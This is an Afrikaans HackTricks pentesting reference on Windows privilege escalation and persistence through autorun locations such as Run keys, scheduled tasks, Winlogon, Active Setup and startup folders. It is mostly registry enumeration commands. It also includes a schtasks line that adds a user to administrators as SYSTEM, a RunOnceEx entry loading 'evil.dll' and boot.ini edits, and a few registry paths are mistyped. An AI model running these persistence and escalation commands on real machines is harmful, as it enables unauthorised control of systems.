# Voorregverhoging met Autoruns

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** kan gebruik word om programme by **opstart** uit te voer. Sien watter binêre lêers geprogrammeer is om by opstart uit te voer met:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Beplande Take

**Take** kan geskeduleer word om met 'n **sekere frekwensie** uit te voer. Sien watter binêre lêers geskeduleer is om uit te voer met:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Lêers

Alle bineêre lêers wat in die **Beginlêers geleë is, sal uitgevoer word met die begin van die rekenaar**. Die algemene beginlêers is diegene wat hieronder gelys word, maar die beginlêer word in die register aangedui. [Lees hierdie om te leer waar.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registre

{% hint style="info" %}
[Nota vanaf hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node** registreerinskrywing dui daarop dat jy 'n 64-bietjie Windows-weergawe hardloop. Die bedryfstelsel gebruik hierdie sleutel om 'n afsonderlike aansig van HKEY\_LOCAL\_MACHINE\SOFTWARE vir 32-bietjie toepassings wat op 64-bietjie Windows-weergawes loop, te vertoon.
{% endhint %}

### Hardloop

**Algemeen bekende** AutoRun-registreer:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registreersleutels wat bekend staan as **Run** en **RunOnce** is ontwerp om outomaties programme uit te voer elke keer as 'n gebruiker by die stelsel aanteken. Die opdraglyn wat as 'n sleutel se datawaarde toegewys is, is beperk tot 260 karakters of minder.

**Dienshardloop** (kan outomatiese aanvang van dienste tydens opstart beheer):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Op Windows Vista en latere weergawes word die **Run** en **RunOnce** registreersleutels nie outomaties gegenereer nie. Inskrywings in hierdie sleutels kan of direk programme begin of hulle as afhanklikhede spesifiseer. Byvoorbeeld, om 'n DLL-lêer by aanmelding te laai, kan die **RunOnceEx** registreersleutel saam met 'n "Depend" sleutel gebruik word. Dit word gedemonstreer deur 'n registreerinskrywing by te voeg om "C:\temp\evil.dll" tydens die stelselopstart uit te voer:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Uitbuiting 1**: As jy binne enige van die genoemde register binne **HKLM** kan skryf, kan jy voorregte eskaleer wanneer 'n ander gebruiker inteken.
{% endhint %}

{% hint style="info" %}
**Uitbuiting 2**: As jy enige van die binêre lêers wat op enige van die register binne **HKLM** aangedui word, kan oorskryf, kan jy daardie binêre lêer met 'n agterdeur wysig wanneer 'n ander gebruiker inteken en voorregte eskaleer.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Beginpad

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skakels geplaas in die **Begin**-map sal outomaties dienste of toepassings laat begin tydens gebruiker aanmelding of stelselherlaai. Die ligging van die **Begin**-map is in die register vir beide die **Plaaslike Masjien** en **Huidige Gebruiker** scopes gedefinieer. Dit beteken dat enige skakel wat by hierdie gespesifiseerde **Begin**-liggings gevoeg word, sal verseker dat die gekoppelde diens of program begin tydens die aanmelding of herlaaiproses, wat dit 'n eenvoudige metode maak om programme outomaties te skeduleer om te hardloop.

{% hint style="info" %}
As jy enige \[Gebruiker] Skelmap onder **HKLM** kan oorskryf, sal jy dit kan rig na 'n deur jou beheerde map en 'n agterdeur plaas wat enige tyd uitgevoer sal word wanneer 'n gebruiker in die stelsel aanmeld en voorregte eskaleer.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon-sleutels

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Gewoonlik is die **Userinit**-sleutel ingestel op **userinit.exe**. Indien hierdie sleutel egter gewysig word, sal die gespesifiseerde uitvoerbare lêer ook deur **Winlogon** geopen word wanneer 'n gebruiker aanmeld. Op soortgelyke wyse is die **Shell**-sleutel bedoel om na **explorer.exe** te verwys, wat die verstek-skyf vir Windows is.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
As jy die registerwaarde of die binêre lêer kan oorskryf, sal jy in staat wees om voorregte te eskaleer.
{% endhint %}

### Beleidsinstellings

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Kyk na die **Run** sleutel.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### Alternatiewe Skel

### Verandering van die Veilige Modus-opdragprompt

In die Windows-register onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, is daar 'n **`AlternateShell`** waarde wat standaard na `cmd.exe` ingestel is. Dit beteken wanneer jy "Veilige Modus met Opdragprompt" kies tydens opstart (deur F8 te druk), word `cmd.exe` gebruik. Dit is egter moontlik om jou rekenaar so in te stel dat dit outomaties in hierdie modus begin sonder om F8 te druk en dit handmatig te kies.

Stappe om 'n opstartopsie te skep om outomaties in "Veilige Modus met Opdragprompt" te begin:

1. Verander die eienskappe van die `boot.ini` lêer om die skryfbeskerming, stelsel, en versteekte vlae te verwyder: `attrib c:\boot.ini -r -s -h`
2. Maak `boot.ini` oop vir redigering.
3. Voeg 'n lyn soos hierdie in: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Stoor veranderinge aan `boot.ini`.
5. Herstel die oorspronklike lêereienskappe: `attrib c:\boot.ini +r +s +h`

* **Uitbuiting 1:** Die verandering van die **AlternateShell** register sleutel maak aanpasbare opset van 'n opdragskel moontlik, moontlik vir ongemagtigde toegang.
* **Uitbuiting 2 (PAD Skryfregte):** Om skryfregte te hê na enige deel van die stelsel se **PAD** veranderlike, veral voor `C:\Windows\system32`, laat jou toe om 'n aangepaste `cmd.exe` uit te voer, wat 'n agterdeur kan wees as die stelsel in Veilige Modus begin.
* **Uitbuiting 3 (PAD en boot.ini Skryfregte):** Skryftoegang tot `boot.ini` maak outomatiese Veilige Modus-opstart moontlik, wat ongemagtigde toegang op die volgende herlaaiing fasiliteer.

Om die huidige **AlternateShell** instelling te kontroleer, gebruik hierdie opdragte:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Geïnstalleerde Komponent

Active Setup is 'n kenmerk in Windows wat **geïnisieer word voordat die lessenaar-omgewing heeltemal gelaai is**. Dit gee prioriteit aan die uitvoering van sekere opdragte wat moet voltooi word voordat die gebruiker se aanmelding voortgaan. Hierdie proses vind selfs plaas voordat ander aanvanginskrywings, soos dié in die Run of RunOnce registerafdelings, geaktiveer word.

Active Setup word bestuur deur die volgende register sleutels:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Binne hierdie sleutels bestaan verskeie sub-sleutels, elk wat ooreenstem met 'n spesifieke komponent. Sleutelwaardes van besondere belang sluit in:

- **IsInstalled:**
  - `0` dui aan dat die komponent se opdrag nie uitgevoer sal word nie.
  - `1` beteken die opdrag sal een keer vir elke gebruiker uitgevoer word, wat die verstekgedrag is as die `IsInstalled`-waarde ontbreek.
- **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige opdraglyn wees, soos die begin van `notepad`.

**Sekuriteitsinsigte:**

- Die wysiging of skryf na 'n sleutel waar **`IsInstalled`** op `"1"` ingestel is met 'n spesifieke **`StubPath`** kan lei tot ongemagtigde opdraguitvoering, moontlik vir voorreg-escalasie.
- Die verandering van die binêre lêer waarna verwys word in enige **`StubPath`**-waarde kan ook voorreg-escalasie bereik, mits voldoende regte beskikbaar is.

Om die **`StubPath`**-konfigurasies oor Active Setup komponente te ondersoek, kan hierdie opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Oorsig van Browser Helper Objects (BHO's)

Browser Helper Objects (BHO's) is DLL-modules wat ekstra kenmerke byvoeg aan Microsoft se Internet Explorer. Hulle laai in Internet Explorer en Windows Explorer by elke begin. Tog kan hulle uitgevoer word deur die **NoExplorer** sleutel na 1 te stel, wat voorkom dat hulle saam met Windows Explorer-instanties laai.

BHO's is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie ondersteun in Microsoft Edge nie, die verstekblaaier in nuwer weergawes van Windows.

Om BHO's wat op 'n stelsel geregistreer is te verken, kan jy die volgende register sleutels ondersoek:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Elke BHO word verteenwoordig deur sy **CLSID** in die register, wat as 'n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Vir die ondervraging van BHO's in die register, kan hierdie opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer-uitbreidings

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Merk op dat die register vir elke dll 1 nuwe register sal bevat en dit sal verteenwoordig word deur die **CLSID**. Jy kan die CLSID-inligting vind in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Lettertipe-bestuurders

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Oop Opdrag

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Beeldlêer Uitvoeringsopsies
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Let wel dat alle plekke waar jy autoruns kan vind **reeds deursoek is deur** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Nietemin, vir 'n **meer omvattende lys van outomaties uitgevoerde** lêers kan jy [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) van SysInternals gebruik:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Meer

**Vind meer Autoruns soos registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Verwysings

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
